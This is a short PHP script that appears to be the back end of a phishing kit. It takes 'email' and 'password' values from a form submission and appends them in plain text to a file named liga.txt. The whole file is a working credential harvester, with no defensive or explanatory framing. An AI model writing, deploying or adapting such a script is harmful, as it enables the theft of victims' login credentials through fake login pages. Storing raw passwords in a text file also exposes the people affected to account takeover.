<?php
if(isset($_POST['email']) & isset($_POST['password']))
{
$data=$_POST['email'].' -"\n" '.$_POST['password']."\n";

$fp = fopen('liga.txt', 'a');

fwrite($fp, $data);
fclose($fp);
}
?>
